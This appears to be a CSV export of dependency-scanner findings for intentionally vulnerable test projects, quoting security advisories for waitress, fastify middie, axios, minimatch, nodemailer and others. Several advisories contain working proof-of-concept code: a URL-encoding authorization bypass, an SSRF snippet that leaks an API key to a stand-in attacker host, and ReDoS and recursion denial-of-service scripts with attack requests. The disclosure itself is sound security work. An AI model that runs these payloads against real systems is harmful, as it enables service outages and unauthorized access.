PIPAUDIT-VULNPY-010,pip-audit,vulnpy,sca,,MEDIUM,waitress@2.0.0,"Waitress is a Web Server Gateway Interface server for Python 2 and 3. When using Waitress versions 2.1.0 and prior behind a proxy that does not properly validate the incoming HTTP request matches the RFC7230 standard, Waitress and the frontend proxy may disagree on where one request starts and where it ends. This would allow requests to be smuggled via the front-end proxy to waitress and later behavior. There are two classes of vulnerability that may lead to request smuggling that are addressed by this advisory: The use of Python's `int()` to parse strings into integers, leading to `+10` to be parsed as `10`, or `0x01` to be parsed as `1`, where as the standard specifies that the string should contain only digits or hex digits; and Waitress does not support chunk extensions, however it was discarding them without validating that they did not contain illegal characters. This vulnerability has been patched in Waitress 2.1.1. A workaround is available. When deploying a proxy in front of waitress, turning on any and all functionality to make sure that the request matches the RFC7230 standard. Certain proxy servers may not have this functionality though and users are encouraged to upgrade to the latest version of waitress instead.",PYSEC-2022-169

This leads to a busy-loop calling the write function. A remote attacker could run waitress out of available sockets with very little resources required. Waitress 3.0.1 contains fixes that remove the race condition.",PYSEC-2024-211

When request lookahead is disabled (default) we won't read any more requests, and when the first request fails due to a parsing error, we simply close the connection. However when request lookahead is enabled, it is possible to process and receive the first request, start sending the error message back to the client while we read the next request and queue it. This will allow the secondary request to be serviced by the worker thread while the connection should be closed. Waitress 3.0.1 fixes the race condition.

This vulnerability has been shown to allow access to endpoints restricted by gunicorn. This issue has been addressed in version 22.0.0.

Your generated code is vulnerable if _all_ the following conditions are true: - You use Babel to compile [regular expression named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group) - You use the `.replace` method on a regular expression that contains named capturing groups - **Your code uses untrusted strings as the second argument of `.replace`** If you are using `@babel/preset-env` with the [`targets`](https://babeljs.io/docs/options#targets) option, the transform that injects the vulnerable code is automatically enabled if: - you use [_duplicated_ named capturing groups](https://github.com/tc39/proposal-duplicate-named-capturing-groups), and target any browser older than Chrome/Edge 126, Opera 112, Firefox 129, Safari 17.4, or Node.js 23 - you use any [named capturing groups](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Regular_expressions/Named_capturing_group), and target any browser older than Chrome 64, Opera 71, Edge 79, Firefox 78, Safari 11.1, or Node.js 10 You can verify what transforms `@babel/preset-env` is using by enabling the [`debug` option](https://babeljs.io/docs/babel-preset-env#debug). ### Patches This problem has been fixed in `@babel/helpers` and `@babel/runtime` 7.26.10 and 8.0.0-alpha.17, please upgrade. It's likely that you do not directly depend on `@babel/helpers`, and instead you depend on `@babel/core` (which itself depends on `@babel/helpers`).

DEPCHECK-BROKEN-CRYSTALS-004,dep-check,broken-crystals,sca,CWE-177,HIGH,@fastify/middie:8.3.3,"### Summary A security vulnerability exists in `@fastify/middie` where middleware registered with a specific path prefix can be bypassed using URL-encoded characters (e.g., `/%61dmin` instead of `/admin`). While the middleware engine fails to match the encoded path and skips execution, the underlying Fastify router correctly decodes the path and matches the route handler, allowing attackers to access protected endpoints without the middleware constraints. ### Details The vulnerability is caused by how `middie` matches requests against registered middleware paths. 1. **Regex Generation**: When [fastify.use('/admin', ...)](cci:1://file:///Users/harshjaiswal/work/research/nest/packages/platform-fastify/adapters/fastify-adapter.ts:733:2-741:3) is called, `middie` uses `path-to-regexp` to generate a regular expression for the path `/admin`. 2. **Request Matching**: For every request, `middie` executes this regular expression against `req.url` (or `req.originalUrl`). 3. **The Flaw**: `req.url` in Fastify contains the **raw, undecoded** path string. * The generated regex expects a decoded path (e.g., `/admin`). * If a request is sent to `/%61dmin`, the regex comparison fails (`/^\/admin/` does not match `/%61dmin`). * `middie` assumes the middleware does not apply and calls `next()`. 4. **Route Execution**: The request proceeds to Fastify's internal router, which performs URL decoding. It correctly identifies `/%61dmin` as `/admin` and executes the corresponding route handler. **Incriminated Source Code:** In the provided `middie` source: ```javascript // ... inside Holder function if (regexp) { const result = regexp.exec(url) // <--- 'url' is undecoded. if (result) { // ... executes middleware ... } else { that.done() // <--- Middleware skipped on mismatch } } ``` ### PoC **Step 1:** Run the following Fastify application (save as `app.js`): ```javascript const fastify = require('fastify')({ logger: true }); async function start() { // Register middie for Express-style middleware support await fastify.register(require('@fastify/middie')); // Middleware to block /admin route fastify.use('/admin', (req, res, next) => { res.statusCode = 403; res.end('Forbidden: Access to /admin is blocked'); }); // Sample routes fastify.get('/', async (request, reply) => { return { message: 'Welcome to the homepage' }; }); fastify.get('/admin', async (request, reply) => { return { message: 'Admin panel' }; }); // Start server try { await fastify.listen({ port: 3008 }); } catch (err) { fastify.log.error(err); process.exit(1); } } start(); ``` **Step 2:** Execute the attack. 1. **Normal Request (Blocked):** ```bash curl http://localhost:3008/admin # Output: Forbidden: Access to /admin is blocked ``` 2. **Bypass Request (Successful):** ```bash curl http://localhost:3008/%61dmin # Output: {""message"":""Admin panel""} ``` ### Impact * **Type:** Authentication/Authorization Bypass. * **Affected Components:** Applications using `@fastify/middie` to apply security controls (auth, rate limiting, IP filtering) to specific route prefixes. * **Severity:** High. Attackers can trivially bypass critical security middleware to access protected administrative or sensitive endpoints.",GHSA-cxrg-g7r8-w69p

When Fastify router normalization options are enabled (such as `ignoreDuplicateSlashes`, `useSemicolonDelimiter`, and related trailing-slash behavior), crafted request paths may bypass middleware checks while still being routed to protected handlers. ## Impact An unauthenticated remote attacker can access endpoints intended to be protected by middleware-based auth/authorization controls by sending specially crafted URL paths (for example, `//secret` or `/secret;foo=bar`), depending on router option configuration. This may lead to unauthorized access to protected functionality and data exposure. ## Affected versions - Confirmed affected: `@fastify/middie@9.1.0` - All versions prior to the patch are affected. ## Patched versions - Fixed in: *9.2.0* ## Details The issue is caused by canonicalization drift between: 1. `@fastify/middie` path matching for `app.use('/prefix', ...)`, and 2. Fastify/find-my-way route lookup normalization. Because middleware and router did not always evaluate the same normalized path, auth middleware could be skipped while route resolution still succeeded. ## Workarounds Until patched version is deployed: - Avoid relying solely on path-scoped middie guards for auth/authorization. - Enforce auth at route-level handlers/hooks after router normalization. - Disable risky normalization combinations only if operationally feasible. ## Resources - Fluid Attacks Disclosure Policy: https://fluidattacks.com/advisories/policy - Fluid Attacks advisory URL: https://fluidattacks.com/advisories/jimenez ## Credits - **Cristian Vargas** (Fluid Attacks Research Team) — discovery and report. - **Oscar Uribe** (Fluid Attacks) — coordination and disclosure.",GHSA-8p85-9qpw-fwgw

DEPCHECK-BROKEN-CRYSTALS-014,dep-check,broken-crystals,sca,CWE-770,HIGH,axios:1.7.7,"## Summary When Axios runs on Node.js and is given a URL with the `data:` scheme, it does not perform HTTP. Instead, its Node http adapter decodes the entire payload into memory (`Buffer`/`Blob`) and returns a synthetic 200 response. This path ignores `maxContentLength` / `maxBodyLength` (which only protect HTTP responses), so an attacker can supply a very large `data:` URI and cause the process to allocate unbounded memory and crash (DoS), even if the caller requested `responseType: 'stream'`. ## Details The Node adapter (`lib/adapters/http.js`) supports the `data:` scheme. When `axios` encounters a request whose URL starts with `data:`, it does not perform an HTTP request. Instead, it calls `fromDataURI()` to decode the Base64 payload into a Buffer or Blob. Relevant code from [`[httpAdapter](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L231): ```js const fullPath = buildFullPath(config.baseURL, config.url, config.allowAbsoluteUrls); const parsed = new URL(fullPath, platform.hasBrowserEnv ? platform.origin : undefined); const protocol = parsed.protocol || supportedProtocols[0]; if (protocol === 'data:') { let convertedData; if (method !== 'GET') { return settle(resolve, reject, { status: 405, ... }); } convertedData = fromDataURI(config.url, responseType === 'blob', { Blob: config.env && config.env.Blob }); return settle(resolve, reject, { data: convertedData, status: 200, ... }); } ``` The decoder is in [`[lib/helpers/fromDataURI.js](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/helpers/fromDataURI.js#L27): ```js export default function fromDataURI(uri, asBlob, options) { ... if (protocol === 'data') { uri = protocol.length ? uri.slice(protocol.length + 1) : uri; const match = DATA_URL_PATTERN.exec(uri); ... const body = match[3]; const buffer = Buffer.from(decodeURIComponent(body), isBase64 ? 'base64' : 'utf8'); if (asBlob) { return new _Blob([buffer], {type: mime}); } return buffer; } throw new AxiosError('Unsupported protocol ' + protocol, ...); } ``` * The function decodes the entire Base64 payload into a Buffer with no size limits or sanity checks. * It does **not** honour `config.maxContentLength` or `config.maxBodyLength`, which only apply to HTTP streams. * As a result, a `data:` URI of arbitrary size can cause the Node process to allocate the entire content into memory. In comparison, normal HTTP responses are monitored for size, the HTTP adapter accumulates the response into a buffer and will reject when `totalResponseBytes` exceeds [`[maxContentLength](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550)`](https://github.com/axios/axios/blob/c959ff29013a3bc90cde3ac7ea2d9a3f9c08974b/lib/adapters/http.js#L550).

DEPCHECK-BROKEN-CRYSTALS-015,dep-check,broken-crystals,sca,CWE-918,HIGH,axios:1.7.7,"### Summary A previously reported issue in axios demonstrated that using protocol-relative URLs could lead to SSRF (Server-Side Request Forgery). Reference: axios/axios#6463 A similar problem that occurs when passing absolute URLs rather than protocol-relative URLs to axios has been identified. Even if ⁠`baseURL` is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. ### Details Consider the following code snippet: ```js import axios from ""axios""; const internalAPIClient = axios.create({ baseURL: ""http://example.test/api/v1/users/"", headers: { ""X-API-KEY"": ""1234567890"", }, }); // const userId = ""123""; const userId = ""http://attacker.test/""; await internalAPIClient.get(userId); // SSRF ``` In this example, the request is sent to `http://attacker.test/` instead of the `baseURL`. As a result, the domain owner of `attacker.test` would receive the `X-API-KEY` included in the request headers. It is recommended that: - When `baseURL` is set, passing an absolute URL such as `http://attacker.test/` to `get()` should not ignore `baseURL`. - Before sending the HTTP request (after combining the `baseURL` with the user-provided parameter), axios should verify that the resulting URL still begins with the expected `baseURL`. ### PoC Follow the steps below to reproduce the issue: 1. Set up two simple HTTP servers: ``` mkdir /tmp/server1 /tmp/server2 echo ""this is server1"" > /tmp/server1/index.html echo ""this is server2"" > /tmp/server2/index.html python -m http.server -d /tmp/server1 10001 & python -m http.server -d /tmp/server2 10002 & ``` 2. Create a script (e.g., main.js): ```js import axios from ""axios""; const client = axios.create({ baseURL: ""http://localhost:10001/"" }); const response = await client.get(""http://localhost:10002/""); console.log(response.data); ``` 3. Run the script: ``` $ node main.js this is server2 ``` Even though `baseURL` is set to `http://localhost:10001/`, axios sends the request to `http://localhost:10002/`. ### Impact - Credential Leakage: Sensitive API keys or credentials (configured in axios) may be exposed to unintended third-party hosts if an absolute URL is passed. - SSRF (Server-Side Request Forgery): Attackers can send requests to other internal hosts on the network where the axios program is running. - Affected Users: Software that uses `baseURL` and does not validate path parameters is affected by this issue.",GHSA-jr5f-v2jv-69x6

The attacker sends a `fetch('http://127.0.0.1:8000/main.js')` request by JS in that malicious web page. This request is normally blocked by same-origin policy, but that's not the case for the reasons above. 1. The attacker gets the content of `http://127.0.0.1:8000/main.js`. In this scenario, I assumed that the attacker knows the URL of the bundle output file name. But the attacker can also get that information by - Fetching `/index.html`: normally you have a script tag here - Fetching `/assets`: it's common to have a `assets` directory when you have JS files and CSS files in a different directory and the directory listing feature tells the attacker the list of files - Connecting `/esbuild` SSE endpoint: the SSE endpoint sends the URL path of the changed files when the file is changed (`new EventSource('/esbuild').addEventListener('change', e => console.log(e.type, e.data))`) - Fetching URLs in the known file: once the attacker knows one file, the attacker can know the URLs imported from that file The scenario above fetches the compiled content, but if the victim has the source map option enabled, the attacker can also get the non-compiled content by fetching the source map file. ### PoC 1.

By appending a tab character (`\t`) followed by arbitrary content to the Content-Type header, attackers can bypass body validation while the server still processes the body as the original content type. For example, a request with `Content-Type: application/json\ta` will bypass JSON schema validation but still be parsed as JSON. This vulnerability affects all Fastify users who rely on Content-Type-based body validation schemas to enforce data integrity or security constraints. The concrete impact depends on the handler implementation and the level of trust placed in the validated request body, but at the library level, this allows complete bypass of body validation for any handler using Content-Type-discriminated schemas. This issue is a regression or missed edge case from the fix for a previously reported vulnerability. ### Patches This vulnerability has been patched in **Fastify v5.7.2**. All users should upgrade to this version or later immediately. ### Workarounds If upgrading is not immediately possible, user can implement a custom `onRequest` hook to reject requests containing tab characters in the Content-Type header: ```javascript fastify.addHook('onRequest', async (request, reply) => { const contentType = request.headers['content-type'] if (contentType && contentType.includes('\t')) { reply.code(400).send({ error: 'Invalid Content-Type header' }) } }) ``` ### Resources - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/validation.js#L272 - https://github.com/fastify/fastify/blob/759e9787b5669abf953068e42a17bffba7521348/lib/content-type-parser.js#L125 - [Fastify Validation and Serialization Documentation](https://fastify.dev/docs/latest/Reference/Validation-and-Serialization/) - https://hackerone.com/reports/3464114",GHSA-jx2c-rxcm-jvmq

DEPCHECK-BROKEN-CRYSTALS-027,dep-check,broken-crystals,sca,CWE-330,CRITICAL,form-data:4.0.0,"### Summary form-data uses `Math.random()` to select a boundary value for multipart form-encoded data. This can lead to a security issue if an attacker: 1. can observe other values produced by Math.random in the target application, and 2. can control one field of a request made using form-data Because the values of Math.random() are pseudo-random and predictable (see: https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f), an attacker who can observe a few sequential values can determine the state of the PRNG and predict future values, includes those used to generate form-data's boundary value. The allows the attacker to craft a value that contains a boundary value, allowing them to inject additional parameters into the request. This is largely the same vulnerability as was [recently found in `undici`](https://hackerone.com/reports/2913312) by [`parrot409`](https://hackerone.com/parrot409?type=user) -- I'm not affiliated with that researcher but want to give credit where credit is due! My PoC is largely based on their work. ### Details The culprit is this line here: https://github.com/form-data/form-data/blob/426ba9ac440f95d1998dac9a5cd8d738043b048f/lib/form_data.js#L347 An attacker who is able to predict the output of Math.random() can predict this boundary value, and craft a payload that contains the boundary value, followed by another, fully attacker-controlled field. This is roughly equivalent to any sort of improper escaping vulnerability, with the caveat that the attacker must find a way to observe other Math.random() values generated by the application to solve for the state of the PRNG. However, Math.random() is used in all sorts of places that might be visible to an attacker (including by form-data itself, if the attacker can arrange for the vulnerable application to make a request to an attacker-controlled server using form-data, such as a user-controlled webhook -- the attacker could observe the boundary values from those requests to observe the Math.random() outputs). A common example would be a `x-request-id` header added by the server. These sorts of headers are often used for distributed tracing, to correlate errors across the frontend and backend. `Math.random()` is a fine place to get these sorts of IDs (in fact, [opentelemetry uses Math.random for this purpose](https://github.com/open-telemetry/opentelemetry-js/blob/2053f0d3a44631ade77ea04f656056a2c8a2ae76/packages/opentelemetry-sdk-trace-base/src/platform/node/RandomIdGenerator.ts#L22)) ### PoC PoC here: https://github.com/benweissmann/CVE-2025-7783-poc Instructions are in that repo. It's based on the PoC from https://hackerone.com/reports/2913312 but simplified somewhat; the vulnerable application has a more direct side-channel from which to observe Math.random() values (a separate endpoint that happens to include a randomly-generated request ID). ### Impact For an application to be vulnerable, it must: - Use `form-data` to send data including user-controlled data to some other system. The attacker must be able to do something malicious by adding extra parameters (that were not intended to be user-controlled) to this request. Depending on the target system's handling of repeated parameters, the attacker might be able to overwrite values in addition to appending values (some multipart form handlers deal with repeats by overwriting values instead of representing them as an array) - Reveal values of Math.random(). It's easiest if the attacker can observe multiple sequential values, but more complex math could recover the PRNG state to some degree of confidence with non-sequential values. If an application is vulnerable, this allows an attacker to make arbitrary requests to internal systems.",GHSA-fjxv-7rqg-78g4

DEPCHECK-BROKEN-CRYSTALS-036,dep-check,broken-crystals,sca,CWE-1333,HIGH,minimatch:3.1.2,"### Summary Nested `*()` extglobs produce regexps with nested unbounded quantifiers (e.g. `(?:(?:a|b)*)*`), which exhibit catastrophic backtracking in V8. With a 12-byte pattern `*(*(*(a|b)))` and an 18-byte non-matching input, `minimatch()` stalls for over 7 seconds. Adding a single nesting level or a few input characters pushes this to minutes. This is the most severe finding: it is triggered by the default `minimatch()` API with no special options, and the minimum viable pattern is only 12 bytes. The same issue affects `+()` extglobs equally. --- ### Details The root cause is in `AST.toRegExpSource()` at [`src/ast.ts#L598`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/ast.ts#L598). For the `*` extglob type, the close token emitted is `)*` or `)?`, wrapping the recursive body in `(?:...)*`. When extglobs are nested, each level adds another `*` quantifier around the previous group: ```typescript : this.type === '*' && bodyDotAllowed ? `)?` : `)${this.type}` ``` This produces the following regexps: | Pattern | Generated regex | |----------------------|------------------------------------------| | `*(a\|b)` | `/^(?:a\|b)*$/` | | `*(*(a\|b))` | `/^(?:(?:a\|b)*)*$/` | | `*(*(*(a\|b)))` | `/^(?:(?:(?:a\|b)*)*)*$/` | | `*(*(*(*(a\|b))))` | `/^(?:(?:(?:(?:a\|b)*)*)*)*$/` | These are textbook nested-quantifier patterns. Against an input of repeated `a` characters followed by a non-matching character `z`, V8's backtracking engine explores an exponential number of paths before returning `false`. The generated regex is stored on `this.set` and evaluated inside `matchOne()` at [`src/index.ts#L1010`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L1010) via `p.test(f)`. It is reached through the standard `minimatch()` call with no configuration. Measured times via `minimatch()`: | Pattern | Input | Time | |----------------------|--------------------|------------| | `*(*(a\|b))` | `a` x30 + `z` | ~68,000ms | | `*(*(*(a\|b)))` | `a` x20 + `z` | ~124,000ms | | `*(*(*(*(a\|b))))` | `a` x25 + `z` | ~116,000ms | | `*(a\|a)` | `a` x25 + `z` | ~2,000ms | Depth inflection at fixed input `a` x16 + `z`: | Depth | Pattern | Time | |-------|----------------------|--------------| | 1 | `*(a\|b)` | 0ms | | 2 | `*(*(a\|b))` | 4ms | | 3 | `*(*(*(a\|b)))` | 270ms | | 4 | `*(*(*(*(a\|b))))` | 115,000ms | Going from depth 2 to depth 3 with a 20-character input jumps from 66ms to 123,544ms -- a 1,867x increase from a single added nesting level. --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- verify the generated regexps and timing (standalone script)** Save as `poc4-validate.mjs` and run with `node poc4-validate.mjs`: ```javascript import { minimatch, Minimatch } from 'minimatch' function timed(fn) { const s = process.hrtime.bigint() let result, error try { result = fn() } catch(e) { error = e } const ms = Number(process.hrtime.bigint() - s) / 1e6 return { ms, result, error } } // Verify generated regexps for (let depth = 1; depth <= 4; depth++) { let pat = 'a|b' for (let i = 0; i < depth; i++) pat = `*(${pat})` const re = new Minimatch(pat, {}).set?.[0]?.[0]?.toString() console.log(`depth=${depth} ""${pat}"" -> ${re}`) } // depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ // depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ // depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ // depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ // Safe-length timing (exponential growth confirmation without multi-minute hang) const cases = [ ['*(*(*(a|b)))', 15], // ~270ms ['*(*(*(a|b)))', 17], // ~800ms ['*(*(*(a|b)))', 19], // ~2400ms ['*(*(a|b))', 23], // ~260ms ['*(a|b)', 101], // <5ms (depth=1 control) ] for (const [pat, n] of cases) { const t = timed(() => minimatch('a'.repeat(n) + 'z', pat)) console.log(`""${pat}"" n=${n}: ${t.ms.toFixed(0)}ms result=${t.result}`) } // Confirm noext disables the vulnerability const t_noext = timed(() => minimatch('a'.repeat(18) + 'z', '*(*(*(a|b)))', { noext: true })) console.log(`noext=true: ${t_noext.ms.toFixed(0)}ms (should be ~0ms)`) // +() is equally affected const t_plus = timed(() => minimatch('a'.repeat(17) + 'z', '+(+(+(a|b)))')) console.log(`""+(+(+(a|b)))"" n=18: ${t_plus.ms.toFixed(0)}ms result=${t_plus.result}`) ``` Observed output: ``` depth=1 ""*(a|b)"" -> /^(?:a|b)*$/ depth=2 ""*(*(a|b))"" -> /^(?:(?:a|b)*)*$/ depth=3 ""*(*(*(a|b)))"" -> /^(?:(?:(?:a|b)*)*)*$/ depth=4 ""*(*(*(*(a|b))))"" -> /^(?:(?:(?:(?:a|b)*)*)*)*$/ ""*(*(*(a|b)))"" n=15: 269ms result=false ""*(*(*(a|b)))"" n=17: 268ms result=false ""*(*(*(a|b)))"" n=19: 2408ms result=false ""*(*(a|b))"" n=23: 257ms result=false ""*(a|b)"" n=101: 0ms result=false noext=true: 0ms (should be ~0ms) ""+(+(+(a|b)))"" n=18: 6300ms result=false ``` **Step 2 -- HTTP server (event loop starvation proof)** Save as `poc4-server.mjs`: ```javascript import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3001 http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) const pattern = url.searchParams.get('pattern') ??

The entire 63-second `time_total` is time spent waiting for the event loop to be released. The benign request was only dispatched after the attack completed, confirmed by the server log timestamps. Note: standalone script timing (~7s at n=19) is lower than server timing (64s) because the standalone script had warmed up V8's JIT through earlier sequential calls. A cold server hits the worst case. Both measurements confirm catastrophic backtracking -- the server result is the more realistic figure for production impact. --- ### Impact Any context where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments, multi-tenant platforms where users configure glob-based rules (file filters, ignore lists, include patterns), and CI/CD pipelines that evaluate user-submitted config files containing glob expressions. No evidence was found of production HTTP servers passing raw user input directly as the extglob pattern, so that framing is not claimed here. Depth 3 (`*(*(*(a|b)))`, 12 bytes) stalls the Node.js event loop for 7+ seconds with an 18-character input. Depth 2 (`*(*(a|b))`, 9 bytes) reaches 68 seconds with a 31-character input. Both the pattern and the input fit in a query string or JSON body without triggering the 64 KB length guard. `+()` extglobs share the same code path and produce equivalent worst-case behavior (6.3 seconds at depth=3 with an 18-character input, confirmed). **Mitigation available:** passing `{ noext: true }` to `minimatch()` disables extglob processing entirely and reduces the same input to 0ms. Applications that do not need extglob syntax should set this option when handling untrusted patterns.",GHSA-23c5-xmqv-rm74
DEPCHECK-BROKEN-CRYSTALS-037,dep-check,broken-crystals,sca,CWE-407,HIGH,minimatch:3.1.2,"### Summary `matchOne()` performs unbounded recursive backtracking when a glob pattern contains multiple non-adjacent `**` (GLOBSTAR) segments and the input path does not match. The time complexity is O(C(n, k)) -- binomial -- where `n` is the number of path segments and `k` is the number of globstars. With k=11 and n=30, a call to the default `minimatch()` API stalls for roughly 5 seconds. With k=13, it exceeds 15 seconds. No memoization or call budget exists to bound this behavior. --- ### Details The vulnerable loop is in `matchOne()` at [`src/index.ts#L960`](https://github.com/isaacs/minimatch/blob/v10.2.2/src/index.ts#L960): ```typescript while (fr < fl) { .. if (this.matchOne(file.slice(fr), pattern.slice(pr), partial)) { .. return true } .. fr++ } ``` When a GLOBSTAR is encountered, the function tries to match the remaining pattern against every suffix of the remaining file segments. Each `**` multiplies the number of recursive calls by the number of remaining segments. With k non-adjacent globstars and n file segments, the total number of calls is C(n, k). There is no depth counter, visited-state cache, or budget limit applied to this recursion. The call tree is fully explored before returning `false` on a non-matching input. Measured timing with n=30 path segments: | k (globstars) | Pattern size | Time | |---------------|--------------|----------| | 7 | 36 bytes | ~154ms | | 9 | 46 bytes | ~1.2s | | 11 | 56 bytes | ~5.4s | | 12 | 61 bytes | ~9.7s | | 13 | 66 bytes | ~15.9s | --- ### PoC Tested on minimatch@10.2.2, Node.js 20. **Step 1 -- inline script** ```javascript import { minimatch } from 'minimatch' // k=9 globstars, n=30 path segments // pattern: 46 bytes, default options const pattern = '**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/**/a/b' const path = 'a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a/a' const start = Date.now() minimatch(path, pattern) console.log(Date.now() - start + 'ms') // ~1200ms ``` To scale the effect, increase k: ```javascript // k=11 -> ~5.4s, k=13 -> ~15.9s const k = 11 const pattern = Array.from({ length: k }, () => '**/a').join('/') + '/b' const path = Array(30).fill('a').join('/') minimatch(path, pattern) ``` No special options are required. This reproduces with the default `minimatch()` call. **Step 2 -- HTTP server (event loop starvation proof)** The following server demonstrates the event loop starvation effect. It is a minimal harness, not a claim that this exact deployment pattern is common: ```javascript // poc1-server.mjs import http from 'node:http' import { URL } from 'node:url' import { minimatch } from 'minimatch' const PORT = 3000 const server = http.createServer((req, res) => { const url = new URL(req.url, `http://localhost:${PORT}`) if (url.pathname !== '/match') { res.writeHead(404); res.end(); return } const pattern = url.searchParams.get('pattern') ?? '' const path = url.searchParams.get('path') ?? '' const start = process.hrtime.bigint() const result = minimatch(path, pattern) const ms = Number(process.hrtime.bigint() - start) / 1e6 res.writeHead(200, { 'Content-Type': 'application/json' }) res.end(JSON.stringify({ result, ms: ms.toFixed(0) }) + '\n') }) server.listen(PORT) ``` Terminal 1 -- start the server: ``` node poc1-server.mjs ``` Terminal 2 -- send the attack request (k=11, ~5s stall) and immediately return to shell: ``` curl ""http://localhost:3000/match?pattern=**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2F**%2Fa%2Fb&path=a%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa%2Fa"" & ``` Terminal 3 -- while the attack is in-flight, send a benign request: ``` curl -w ""\ntime_total: %{time_total}s\n"" ""http://localhost:3000/match?pattern=**%2Fy%2Fz&path=x%2Fy%2Fz"" ``` **Observed output (Terminal 3):** ``` {""result"":true,""ms"":""0""} time_total: 4.132709s ``` The server reports `""ms"":""0""` -- the legitimate request itself takes zero processing time. The 4+ second `time_total` is entirely time spent waiting for the event loop to be released by the attack request. Every concurrent user is blocked for the full duration of each attack call. Repeating the benign request while no attack is in-flight confirms the baseline: ``` {""result"":true,""ms"":""0""} time_total: 0.001599s ``` --- ### Impact Any application where an attacker can influence the glob pattern passed to `minimatch()` is vulnerable. The realistic attack surface includes build tools and task runners that accept user-supplied glob arguments (ESLint, Webpack, Rollup config), multi-tenant systems where one tenant configures glob-based rules that run in a shared process, admin or developer interfaces that accept ignore-rule or filter configuration as globs, and CI/CD pipelines that evaluate user-submitted config files containing glob patterns. An attacker who can place a crafted pattern into any of these paths can stall the Node.js event loop for tens of seconds per invocation. The pattern is 56 bytes for a 5-second stall and does not require authentication in contexts where pattern input is part of the feature.",GHSA-7r86-cg39-jmmj

Each `*` compiles to a separate `[^/]*?` regex group, and when the match fails, V8's regex engine backtracks exponentially across all possible splits. The time complexity is O(4^N) where N is the number of `*` characters. With N=15, a single `minimatch()` call takes ~2 seconds. With N=34, it hangs effectively forever. ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._ ### PoC When minimatch compiles a glob pattern, each `*` becomes `[^/]*?` in the generated regex. For a pattern like `***************X***`: ``` /^(?!\.)[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?[^/]*?X[^/]*?[^/]*?[^/]*?$/ ``` When the test string doesn't contain `X`, the regex engine must try every possible way to distribute the characters across all the `[^/]*?` groups before concluding no match exists. With N groups and M characters, this is O(C(N+M, N)) — exponential. ### Impact Any application that passes user-controlled strings to `minimatch()` as the pattern argument is vulnerable to DoS. This includes: - File search/filter UIs that accept glob patterns - `.gitignore`-style filtering with user-defined rules - Build tools that accept glob configuration - Any API that exposes glob matching to untrusted input ---- Thanks to @ljharb for back-porting the fix to legacy versions of minimatch.",GHSA-3ppc-4f35-3m26

DEPCHECK-BROKEN-CRYSTALS-040,dep-check,broken-crystals,sca,CWE-703,HIGH,nodemailer:6.9.15,"### Summary A DoS can occur that immediately halts the system due to the use of an unsafe function. ### Details According to **RFC 5322**, nested group structures (a group inside another group) are not allowed. Therefore, in lib/addressparser/index.js, the email address parser performs flattening when nested groups appear, since such input is likely to be abnormal. (If the address is valid, it is added as-is.) In other words, the parser flattens all nested groups and inserts them into the final group list. However, the code implemented for this flattening process can be exploited by malicious input and triggers DoS RFC 5322 uses a colon (:) to define a group, and commas (,) are used to separate members within a group. At the following location in lib/addressparser/index.js: https://github.com/nodemailer/nodemailer/blob/master/lib/addressparser/index.js#L90 there is code that performs this flattening. The issue occurs when the email address parser attempts to process the following kind of malicious address header: ```g0: g1: g2: g3: ... gN: victim@example.com;``` Because no recursion depth limit is enforced, the parser repeatedly invokes itself in the pattern `addressparser → _handleAddress → addressparser → ...` for each nested group. As a result, when an attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service. The problematic code section is as follows: ```js if (isGroup) { ... if (data.group.length) { let parsedGroup = addressparser(data.group.join(',')); // <- boom! parsedGroup.forEach(member => { if (member.group) { groupMembers = groupMembers.concat(member.group); } else { groupMembers.push(member); } }); } } ``` `data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number. ### PoC ``` const nodemailer = require('nodemailer'); function buildDeepGroup(depth) { let parts = []; for (let i = 0; i < depth; i++) { parts.push(`g${i}:`); } return parts.join(' ') + ' user@example.com;'; } const DEPTH = 3000; // <- control depth const toHeader = 